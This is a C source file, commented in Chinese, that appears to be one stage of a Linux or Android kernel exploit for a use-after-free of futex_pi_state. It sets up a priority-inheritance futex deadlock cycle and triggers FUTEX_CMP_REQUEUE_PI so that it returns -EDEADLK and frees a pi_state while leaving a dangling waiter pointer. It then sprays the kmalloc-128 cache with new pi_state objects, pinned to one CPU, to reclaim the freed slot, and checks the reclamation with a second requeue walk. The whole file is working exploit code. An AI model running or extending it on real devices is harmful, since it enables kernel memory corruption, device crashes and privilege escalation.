/*
 * g3d_d2.c — futex_pi_state UAF · D2：同 cache 回收 + 走查判定
 *
 * 依据（§21.15/§21.18）：
 *   - CMP_REQUEUE_PI 返回 -EDEADLK ⇒ put_pi_state 归零 ⇒ free_pi_state
 *     ⇒ rt_mutex_proxy_unlock + kfree（目标 futex 的 pi_state 被释放，
 *        内核 owner 变 NULL，用户态字值不变）。
 *   - 悬垂 waiter->lock = &被释放的 pi_state->pi_mutex（pi_state+0x10）。
 *   - 本机无 kmalloc-96/192 ⇒ 88 B 的 pi_state 落在 kmalloc-128。
 *
 * D2 逻辑：
 *   [1] 建环：W 持 B；O 持 C 且阻塞于 B；W 带超时等待 A→C。
 *   [2] main：CMP_REQUEUE_PI(A→C,1) → -EDEADLK（写 waiter->lock=C + 释放 C 的 pi_state）
 *   [3] W 超时早退 → 帧死亡，W->pi_blocked_on 悬垂于该槽（lock=旧 C 地址）
 *   [4] **同 CPU 喷堆**：创建 K 组「持有者 + 阻塞 waiter」的 PI futex，
 *       每组分配 1 个 pi_state（同 cache）。SLUB 的 LIFO 期望第一组就回收
 *       刚释放的那块 ⇒ 旧 C 地址重新变成**有效的** rt_mutex。
 *   [5] 走查判定：新 waiter W2 等 A2→C，main 发 CMP_REQUEUE_PI(A2→C,1)：
 *         链条 C(新pi_state)→O→B(owner W)→W→槽(lock=旧C)
 *         · 回收成功 ⇒ 旧 C 已是有效 rt_mutex：trylock 成功 → 走查安全落地 → 返回 0/1
 *         · 回收失败 ⇒ 旧 C 仍是释放内存 → 自旋或 panic
 *   判据：返回 0/1 且设备存活 = 回收成功（同一 cache 的 UAF 可被 pi_state 自身占用）。
 *
 * 安全：所有 futex 都是正常加解锁，无悬挂踢打；main 与喷堆线程绑定同一 CPU 提高
 *       LIFO 命中率。唯一风险在 [5]：若回收失败会 panic（需重启）。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define LOGPATH "/data/local/tmp/g3d_d2.log"
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_LOCK_PI          6
#define FUTEX_UNLOCK_PI        7
#define FUTEX_PRIVATE_FLAG   128
#define MSPRAY 24

static int logfd = -1;
static double t0;

struct pair {
	uint32_t word;
	volatile int held;
	volatile int waiter_in;
};

struct shared {
	uint32_t A, A2, B, C;
	volatile int w_holds_b;
	volatile int o_holds_c, o_blocked_b;
	volatile int w_waiting, w_ret, w_err, w_returned;
	volatile int w2_waiting;
	struct pair spray[MSPRAY];
	volatile int done;
};

static struct shared *S;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[400], line[480];
	va_list ap;
	int n;
	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%9.1fms] %s\n", now_ms() - t0, buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
	if (logfd >= 0) fsync(logfd);
}

static void abs_timeout(struct timespec *ts, int ms)
{
	clock_gettime(CLOCK_MONOTONIC, ts);
	ts->tv_nsec += (long)ms * 1000000L;
	while (ts->tv_nsec >= 1000000000L) {
		ts->tv_sec += 1;
		ts->tv_nsec -= 1000000000L;
	}
}

static long futex(uint32_t *u, int op, uint32_t val, void *to,
		  uint32_t *u2, uint32_t val3)
{
	return syscall(SYS_futex, u, op, val, to, u2, val3);
}

static int wait_flag(volatile int *p, int ms)
{
	int i, n = ms / 2;
	for (i = 0; i < n; i++) {
		if (*p) return 1;
		usleep(2000);
	}
	return *p;
}

static void pin_cpu0(void)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(0, &set);
	if (sched_setaffinity(0, sizeof(set), &set) != 0)
		lg("sched_setaffinity 失败 errno=%d", errno);
}

/* ---- W：持 B，带超时等 A→C ---- */
static void *th_w(void *arg)
{
	struct timespec ts;
	long r;
	(void)arg;
	if (futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) {
		lg("W: LOCK_PI(B) 失败 errno=%d", errno); return NULL;
	}
	S->w_holds_b = 1;
	abs_timeout(&ts, 600);
	while (!S->o_blocked_b)
		__asm__ __volatile__("" ::: "memory");
	S->w_waiting = 1;
	errno = 0;
	r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &ts, &S->C, 0);
	S->w_ret = (int)r; S->w_err = errno; S->w_returned = 1;
	while (!S->done)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* ---- O：持 C，阻塞于 B ---- */
static void *th_o(void *arg)
{
	(void)arg;
	if (futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) {
		lg("O: LOCK_PI(C) 失败 errno=%d", errno); return NULL;
	}
	S->o_holds_c = 1;
	while (!S->w_holds_b)
		__asm__ __volatile__("" ::: "memory");
	S->o_blocked_b = 1;
	if (futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0)
		lg("O: LOCK_PI(B) 失败 errno=%d", errno);
	while (!S->done)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* ---- W2：等 A2→C（走查触发者） ---- */
static void *th_w2(void *arg)
{
	struct timespec ts;
	long r;
	(void)arg;
	abs_timeout(&ts, 4000);
	S->w2_waiting = 1;
	errno = 0;
	r = futex(&S->A2, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &ts, &S->C, 0);
	lg("W2: WAIT_REQUEUE_PI(A2→C) 返回 %ld errno=%d", r, errno);
	return NULL;
}

/* ---- 喷堆：holder 抢到锁，waiter 阻塞 ⇒ 分配 1 个 pi_state ---- */
static void *th_spray_hold(void *arg)
{
	struct pair *p = arg;
	if (futex(&p->word, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) {
		p->held = -1; return NULL;
	}
	p->held = 1;
	while (!S->done)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

static void *th_spray_wait(void *arg)
{
	struct pair *p = arg;
	struct timespec ts;
	while (p->held == 0 && !S->done)
		__asm__ __volatile__("" ::: "memory");
	p->waiter_in = 1;
	abs_timeout(&ts, 6000);
	(void)futex(&p->word, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, &ts, NULL, 0);
	while (!S->done)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

int main(void)
{
	pthread_t tw, to, tw2, sh[MSPRAY], sw[MSPRAY];
	long r;
	int e, i, sprayed = 0;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	t0 = now_ms();
	lg("===== G3D-D2 start pid=%d =====", getpid());
	pin_cpu0();

	S = mmap(NULL, 8192, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) { lg("mmap FAIL"); return 1; }
	memset(S, 0, 8192);

	/* [1] 建环 */
	pthread_create(&tw, NULL, th_w, NULL);
	pthread_create(&to, NULL, th_o, NULL);
	if (!wait_flag(&S->w_holds_b, 3000) || !wait_flag(&S->o_blocked_b, 3000) ||
	    !wait_flag(&S->w_waiting, 3000)) {
		lg("建环握手失败"); S->done = 1; _exit(2);
	}
	usleep(100000);

	/* [2] 触发 -EDEADLK：写 waiter->lock=C，并释放 C 的 pi_state */
	errno = 0;
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C, 0);
	e = errno;
	lg("[2] CMP_REQUEUE_PI(A→C,1) → %ld errno=%d (%s)", r, e, strerror(e));
	if (!(r == -1 && e == EDEADLK)) { lg("[2] 未命中，终止"); S->done = 1; _exit(3); }

	/* [3] 等 W 超时早退 ⇒ 帧死亡，留下悬垂指针 */
	if (!wait_flag(&S->w_returned, 4000)) {
		lg("[3] W 未返回，终止"); S->done = 1; _exit(4);
	}
	lg("[3] W 返回 %d errno=%d → 悬垂指针留存（lock=旧 C 地址）", S->w_ret, S->w_err);
	lg("[3] C 字值=%u (O.tid 假象) ; 内核 owner 已被 proxy_unlock", S->C);

	/* [4] 同 cache 喷堆（pi_state 88B → kmalloc-128） */
	for (i = 0; i < MSPRAY; i++) {
		if (pthread_create(&sh[i], NULL, th_spray_hold, &S->spray[i]) != 0) break;
		if (pthread_create(&sw[i], NULL, th_spray_wait, &S->spray[i]) != 0) break;
		sprayed++;
	}
	{
		int spin = 0;
		while (spin < 300) {
			int c = 0;
			for (i = 0; i < sprayed; i++)
				if (S->spray[i].held == 1 && S->spray[i].waiter_in) c++;
			if (c == sprayed) break;
			usleep(3000);
			spin++;
		}
	}
	usleep(150000);
	lg("[4] 已喷 %d 组竞争 PI futex（每组 1 个 pi_state，同 cache）", sprayed);

	/* [5] 走查判定 */
	pthread_create(&tw2, NULL, th_w2, NULL);
	if (!wait_flag(&S->w2_waiting, 3000)) {
		lg("[5] W2 未进入等待，终止"); S->done = 1; _exit(5);
	}
	usleep(100000);
	lg("[5] CMP_REQUEUE_PI(A2→C,1)：链条 C→O→B(owner W)→W→槽(lock=旧C)");
	errno = 0;
	r = futex(&S->A2, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C, 0);
	e = errno;
	lg("[5] → %ld errno=%d (%s)", r, e, strerror(e));
	if (r >= 0)
		lg("verdict: **回收成功** —— 旧 C 地址已被新 pi_state 占用，走查安全落地（返回 %ld）", r);
	else
		lg("verdict: 返回错误（errno=%d），可能仍未回收但未崩溃", e);
	lg("结束");
	S->done = 1;
	_exit(0);
}
